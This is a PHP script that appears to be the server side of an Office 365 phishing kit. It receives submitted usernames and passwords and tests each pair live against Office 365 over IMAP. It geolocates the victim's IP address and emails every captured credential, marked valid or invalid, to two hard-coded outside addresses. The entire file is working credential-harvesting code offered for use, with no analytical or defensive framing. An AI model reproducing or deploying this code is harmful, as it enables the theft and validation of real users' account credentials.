<?php header('Access-Control-Allow-Origin: *'); ?>
<?php
@session_start();
ob_start();

ini_set("output_buffering",4096);

function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
    $output = NULL;
    if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) {
        $ip = $_SERVER["REMOTE_ADDR"];
        if ($deep_detect) {
            if (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_CLIENT_IP'];
        }
    }
    $purpose    = str_replace(array("name", "\n", "\t", " ", "-", "_"), NULL, strtolower(trim($purpose)));
    $support    = array("country", "countrycode", "state", "region", "city", "location", "address");
    $continents = array(
        "AF" => "Africa",
        "AN" => "Antarctica",
        "AS" => "Asia",
        "EU" => "Europe",
        "OC" => "Australia (Oceania)",
        "NA" => "North America",
        "SA" => "South America"
    );
    if (filter_var($ip, FILTER_VALIDATE_IP) && in_array($purpose, $support)) {
        $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
        if (@strlen(trim($ipdat->geoplugin_countryCode)) == 2) {
            switch ($purpose) {
                case "location":
                    $output = array(
                        "city"           => @$ipdat->geoplugin_city,
                        "state"          => @$ipdat->geoplugin_regionName,
                        "country"        => @$ipdat->geoplugin_countryName,
                        "country_code"   => @$ipdat->geoplugin_countryCode,
                        "continent"      => @$continents[strtoupper($ipdat->geoplugin_continentCode)],
                        "continent_code" => @$ipdat->geoplugin_continentCode
                    );
                    break;
                case "address":
                    $address = array($ipdat->geoplugin_countryName);
                    if (@strlen($ipdat->geoplugin_regionName) >= 1)
                        $address[] = $ipdat->geoplugin_regionName;
                    if (@strlen($ipdat->geoplugin_city) >= 1)
                        $address[] = $ipdat->geoplugin_city;
                    $output = implode(", ", array_reverse($address));
                    break;
                case "city":
                    $output = @$ipdat->geoplugin_city;
                    break;
                case "state":
                    $output = @$ipdat->geoplugin_regionName;
                    break;
                case "region":
                    $output = @$ipdat->geoplugin_regionName;
                    break;
                case "country":
                    $output = @$ipdat->geoplugin_countryName;
                    break;
                case "countrycode":
                    $output = @$ipdat->geoplugin_countryCode;
                    break;
            }
        }
    }
    return $output;
}

if (isset($_SERVER['HTTP_CLIENT_IP'])) {
	$real_ip_adress = $_SERVER['HTTP_CLIENT_IP'];
}
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
	$real_ip_adress = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
else {
	$real_ip_adress = $_SERVER['REMOTE_ADDR'];
}

$cip = $real_ip_adress;
$address = ip_info("Visitor", "Address");
$main_country = ip_info("Visitor", "Country");

$user = $_POST['u'];
$pass = $_POST['p'];

if(!empty($pass) && !empty($user)) {
	$count = strlen ($pass);
	if ($count > 3) {
		$Checker = @imap_open("{outlook.office365.com:993/imap/ssl}INBOX", $user, $pass);
		if($Checker){
			$message = "MY OFFICE365 RESULT\n";
			$message .= "+++++++++++++++++++++++++++++++++\n";
			$message .= "User: ".$user."\n";
			$message .= "Pass : ".$pass."\n";
			$message .= "Address : ".$cip."\n";
			$message .= "Location : ".$address."\n";
			$message .= "++++++++++++++ 2021 TrueLogin ++++++++++++++\n";
			$resultz = "jamescordy8844@gmail.com,tmalone27@mail.ru"; // Set Your Result Here
			$subject = "$cip | 0Ffice-21 ValidMantap - $main_country";
			mail($resultz, $subject, $message);
			echo 'VALID';
		} else {
			$message = "MY OFFICE365 RESULT\n";
			$message .= "----------------------------------\n";
			$message .= "User: ".$user."\n";
			$message .= "Pass : ".$pass."\n";
			$message .= "Address : ".$cip."\n";
			$message .= "Location : ".$address."\n";
			$message .= "---------------- 2021 TrueLogin --------------\n";
			$resultz = "jamescordy8844@gmail.com,tmalone27@mail.ru"; // Set Your Result Here 
			$subject = "$cip | 0Ffice-21 InValid Butut - $main_country";
			mail($resultz, $subject, $message);
			echo 'GAGAL';
		}
	} else {
		echo 'KURANG';
	}
} else {
	echo 'KOSONG';
}

?>
